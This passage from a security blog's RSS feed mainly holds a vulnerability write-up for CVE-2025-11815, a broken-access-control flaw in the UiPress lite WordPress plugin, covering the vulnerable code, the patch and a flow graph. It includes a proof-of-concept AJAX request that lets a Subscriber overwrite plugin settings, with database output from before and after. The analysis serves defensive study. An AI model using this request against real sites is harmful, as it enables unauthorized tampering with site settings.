leaks&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;LearnPress admin templates were unintentionally exposed through a public REST API.&lt;/li&gt;&#xA;&lt;li&gt;The effective fix is adding &lt;strong&gt;wp_verify_nonce&lt;/strong&gt; and enforcing capability restrictions.&lt;/li&gt;&#xA;&lt;li&gt;WordPress REST APIs must always implement &lt;strong&gt;capability checks&lt;/strong&gt; when handling sensitive operations.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-plugin-4-2-9-4-missing-authorization-to-unauthenticated-arbitrary-callback-execution-to-information-exposure-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin &amp;lt;= 4.2.9.4 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11815 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-10-cve-2025-11815/</link>
      <pubDate>Wed, 10 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-10-cve-2025-11815/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;UiPress lite&lt;/strong&gt; | the &lt;strong&gt;plugin&lt;/strong&gt; that creates &lt;strong&gt;custom dashboards&lt;/strong&gt;, &lt;strong&gt;admin themes&lt;/strong&gt;, and &lt;strong&gt;pages&lt;/strong&gt; for &lt;strong&gt;WordPress&lt;/strong&gt; is easily &lt;strong&gt;exploitable&lt;/strong&gt;, leading to &lt;strong&gt;unauthorized data modification&lt;/strong&gt; due to the lack of &lt;strong&gt;capability checks&lt;/strong&gt; in the &lt;strong&gt;uip_save_site_option()&lt;/strong&gt; function in all versions up to and including &lt;strong&gt;3.5.08&lt;/strong&gt;. This allows an &lt;strong&gt;authenticated attacker&lt;/strong&gt; with &lt;strong&gt;Subscriber-level&lt;/strong&gt; privileges or higher to arbitrarily modify &lt;strong&gt;plugin settings&lt;/strong&gt;. Other &lt;strong&gt;AJAX actions&lt;/strong&gt; are also affected.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11815&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11815&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.08&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.09&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/uipress-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;UiPress lite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.08&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.09&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a long list of AJAX actions:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function load_ajax()&#xA;{&#xA;    $function_names = [&#xA;      &amp;#34;uip_get_users_and_roles&amp;#34;,&#xA;      &amp;#34;uip_get_post_types&amp;#34;,&#xA;      &amp;#34;uip_get_recent_posts&amp;#34;,&#xA;      &amp;#34;uip_get_posts_for_table&amp;#34;,&#xA;      &amp;#34;uip_get_post_table_columns&amp;#34;,&#xA;      &amp;#34;uip_delete_post&amp;#34;,&#xA;      &amp;#34;uip_save_user_preference&amp;#34;,&#xA;      &amp;#34;uip_get_user_preference&amp;#34;,&#xA;      &amp;#34;uip_search_content&amp;#34;,&#xA;      &amp;#34;uip_process_form_input&amp;#34;,&#xA;      &amp;#34;uip_send_form_email&amp;#34;,&#xA;      &amp;#34;uip_save_form_as_option&amp;#34;,&#xA;      &amp;#34;uip_save_form_as_user_option&amp;#34;,&#xA;      &amp;#34;uip_pre_populate_form_data&amp;#34;,&#xA;      &amp;#34;uip_create_frame_switch&amp;#34;,&#xA;      &amp;#34;uip_get_sync_options&amp;#34;,&#xA;      &amp;#34;uip_refresh_sync_key&amp;#34;,&#xA;      &amp;#34;uip_save_sync_options&amp;#34;,&#xA;      &amp;#34;uip_start_site_sync&amp;#34;,&#xA;      &amp;#34;uip_check_for_template_updates&amp;#34;,&#xA;      &amp;#34;uip_process_block_query&amp;#34;,&#xA;      &amp;#34;uip_save_site_option&amp;#34;,&#xA;      &amp;#34;uip_send_message_to_gpt&amp;#34;,&#xA;      &amp;#34;uip_global_export&amp;#34;,&#xA;      &amp;#34;uip_global_import&amp;#34;,&#xA;      &amp;#34;uip_push_new_custom_menu_items&amp;#34;,&#xA;      &amp;#34;uip_remove_custom_menu_items&amp;#34;,&#xA;    ];&#xA;&#xA;    foreach ($function_names as $name) {&#xA;      add_action(&amp;#34;wp_ajax_{$name}&amp;#34;, [$this, $name]);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;wp_ajax_&lt;/code&gt; prefix indicates that these AJAX actions only run for logged-in users.&lt;/p&gt;&#xA;&lt;p&gt;In the vulnerable &lt;strong&gt;v3.5.08&lt;/strong&gt;, none of the callbacks perform capability checks. For example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function uip_save_site_option()&#xA;{&#xA;    Ajax::check_referer();&#xA;&#xA;    $option = json_decode(stripslashes($_POST[&amp;#34;option&amp;#34;]));&#xA;    $option = Sanitize::clean_input_with_code($option);&#xA;    $optionName = sanitize_text_field($_POST[&amp;#34;optionName&amp;#34;]);&#xA;&#xA;    if (!$optionName) {&#xA;      Ajax::error(__(&amp;#34;No option name specified&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;&#xA;    UipOptions::update($optionName, $option);&#xA;&#xA;    $returndata[&amp;#34;success&amp;#34;] = true;&#xA;    $returndata[&amp;#34;message&amp;#34;] = __(&amp;#34;Option saved&amp;#34;, &amp;#34;uipress-lite&amp;#34;);&#xA;    wp_send_json($returndata);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function updates the &lt;code&gt;uip-global-settings&lt;/code&gt; option in the database using &lt;code&gt;option&lt;/code&gt; and &lt;code&gt;optionName&lt;/code&gt; taken directly from the POST request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function update($key = null, $newValue = false)&#xA;{&#xA;    $options = get_option(&amp;#34;uip-global-settings&amp;#34;);&#xA;    $options = $options ? $options : [];&#xA;&#xA;    if (isset($key)) {&#xA;        $options[$key] = $newValue;&#xA;    } else {&#xA;        $options = $newValue;&#xA;    }&#xA;&#xA;    update_option(&amp;#34;uip-global-settings&amp;#34;, $options);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This option is stored in the &lt;code&gt;wp_options&lt;/code&gt; table with &lt;code&gt;option_name = &#39;uip-global-settings&#39;&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_options where option_name=&amp;#39;uip-global-settings&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name         | option_value                                                                 | autoload |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;|       363 | uip-global-settings | a:1:{s:11:&amp;#34;remote-sync&amp;#34;;a:1:{s:3:&amp;#34;key&amp;#34;;s:27:&amp;#34;uip-692c7c8dd99844.95568294&amp;#34;;}} | auto     |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.00 sec)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Although &lt;code&gt;Ajax::check_referer()&lt;/code&gt; enforces CSRF protection using a &lt;code&gt;security&lt;/code&gt; nonce:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function check_referer()&#xA;{&#xA;    $doingAjax = defined(&amp;#34;DOING_AJAX&amp;#34;) &amp;amp;&amp;amp; DOING_AJAX;&#xA;    $referer = check_ajax_referer(&amp;#34;uip-security-nonce&amp;#34;, &amp;#34;security&amp;#34;) &amp;gt; 0;&#xA;    $result = $doingAjax &amp;amp;&amp;amp; $referer;&#xA;&#xA;    if (!$result) {&#xA;        self::error(__(&amp;#34;Unable to perform action&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This nonce appears in the Dashboard of every logged-in user, including Subscribers. However, the AJAX actions themselves are intended only for admin users.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/nonce.png&#34; title=&#34;Nonce in admin Dashboard&#34; data-thumbnail=&#34;/posts/2025-12-10-cve-2025-11815/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce in admin Dashboard&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-10-cve-2025-11815/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;215&#34; width=&#34;838&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in admin Dashboard&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In the patch &lt;strong&gt;v3.5.09&lt;/strong&gt;, the developer added capability checks:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function check_referer()&#xA;{&#xA;    Ajax::check_referer();&#xA;&#xA;    if (!current_user_can(&amp;#34;manage_options&amp;#34;)) {&#xA;      Ajax::error(__(&amp;#34;You do not have permission to perform this action&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_options&lt;/code&gt; is an administrator-level capability, so only admins can execute these AJAX actions.&lt;/p&gt;&#xA;&lt;p&gt;All AJAX callbacks registered above are now protected by the same mechanism in the patched version.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Authenticated user (Subscriber or higher)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Dashboard renders → &amp;#39;uip-security-nonce&amp;#39; is available to all logged-in users&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;Attacker sends AJAX request: action=uip_save_site_option&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;Hook triggered: wp_ajax_uip_save_site_option&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;Ajax::check_referer() validates nonce — passes&amp;#34;]&#xA;--&amp;gt; F[&amp;#34;No capability check is performed&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;uip_save_site_option() executes&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Reads POST parameters: optionName &amp;#43; option&amp;#34;]&#xA;--&amp;gt; I[&amp;#34;Calls UipOptions::update()&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;update_option(&amp;#39;uip-global-settings&amp;#39;, attacker-controlled data)&amp;#34;]&#xA;--&amp;gt; K[&amp;#34;Plugin settings overwritten by a low-privileged user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Log in using a Subscriber account&lt;/li&gt;&#xA;&lt;li&gt;Extract the nonce from the admin Dashboard&lt;/li&gt;&#xA;&lt;li&gt;Send the request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: subcriber&amp;#43;_cookie&#xA;&#xA;action=uip_save_site_option&amp;amp;security=e032057458&amp;amp;option={payload}&amp;amp;optionName=remote-sync&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;--- Before&#xA;mysql&amp;gt; select * from wp_options where option_name=&amp;#39;uip-global-settings&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name         | option_value                                                                 | autoload |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;|       363 | uip-global-settings | a:1:{s:11:&amp;#34;remote-sync&amp;#34;;a:1:{s:3:&amp;#34;key&amp;#34;;s:27:&amp;#34;uip-692c7c8dd99844.95568294&amp;#34;;}} | auto     |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.00 sec)&#xA;&#xA;-- After &#xA;mysql&amp;gt; select * from wp_options where option_name=&amp;#39;uip-global-settings&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;----------------------------------------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name         | option_value                                 | autoload |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;----------------------------------------------&amp;#43;----------&amp;#43;&#xA;|       363 | uip-global-settings | a:1:{s:11:&amp;#34;remote-sync&amp;#34;;O:8:&amp;#34;stdClass&amp;#34;:0:{}} | auto     |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;----------------------------------------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.00 sec)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Error Occurred&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/err.png&#34; title=&#34;An error occurred while changing options&#34; data-thumbnail=&#34;/posts/2025-12-10-cve-2025-11815/err.png&#34; data-sub-html=&#34;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;An error occurred while changing options&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-10-cve-2025-11815/err.png&#39; alt=&#34;Error&#34; height=&#34;347&#34; width=&#34;1252&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;An error occurred while changing options&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in UiPress lite &amp;lt;= 3.5.08 originates from missing capability checks in AJAX callbacks for authenticated users, particularly the &lt;code&gt;uip_save_site_option()&lt;/code&gt; function. Although the plugin uses a nonce for CSRF protection, this nonce is provided to all users, including Subscribers. This enables any low-privileged account to directly invoke privileged AJAX actions and overwrite important plugin settings stored in &lt;code&gt;uip-global-settings&lt;/code&gt;. This is a Broken Access Control flaw allowing low-privilege users to modify admin-only data. The 3.5.09 patch fixes the issue by adding a &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; capability check.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;A CSRF nonce alone is not secure&lt;/strong&gt; without a capability check on the action performed.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;All privileged AJAX actions must validate capability&lt;/strong&gt; before processing data.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonces visible to all users&lt;/strong&gt; can lead to abuse when combined with missing capability checks.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Low-privileged accounts must never be allowed to modify admin settings&lt;/strong&gt;, whether via AJAX or any other 